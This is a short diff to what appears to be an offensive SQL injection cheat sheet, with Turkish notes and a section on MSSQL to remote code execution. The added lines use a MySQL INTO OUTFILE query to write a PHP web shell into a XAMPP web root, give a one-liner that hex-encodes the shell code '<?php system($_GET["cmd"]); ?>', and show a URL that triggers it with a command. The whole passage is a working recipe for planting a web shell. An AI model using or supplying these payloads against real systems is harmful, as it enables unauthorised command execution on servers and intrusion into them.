@@ -32,6 +32,17 @@
 
 Trigger: `http://target/shell.php?c=id`
 
+```sh
+SELECT 0x3c3f70687020737973 -- (hex encoded "<?php syst..." vs.)
+INTO OUTFILE "C:/xampp/htdocs/shell.php";
+```
+
+```sh
+echo -n '<?php system($_GET["cmd"]); ?>' | xxd -p | tr -d '\n'
+```
+
+Başına 0x ekle
+
 ---
 
 ## 3. MSSQL → RCE
